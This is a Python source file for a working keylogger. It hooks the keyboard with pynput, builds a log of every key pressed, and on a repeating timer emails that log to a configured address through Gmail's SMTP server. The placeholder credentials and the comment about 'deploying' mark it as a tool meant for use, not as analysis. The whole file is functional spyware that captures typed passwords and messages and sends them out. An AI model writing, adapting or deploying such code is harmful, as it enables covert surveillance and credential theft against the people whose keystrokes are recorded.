#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string  # Improved string concatenation

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                current_key = " "
            else:
                current_key = f"{str(key)} "  # Using f-string for formatting
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n " + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")  # Print error message

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # This is just for testing; you might want to comment it out or remove it when deploying
    my_keylogger = Keylogger(120, "your_email@gmail.com", "your_email_password")
    my_keylogger.start()
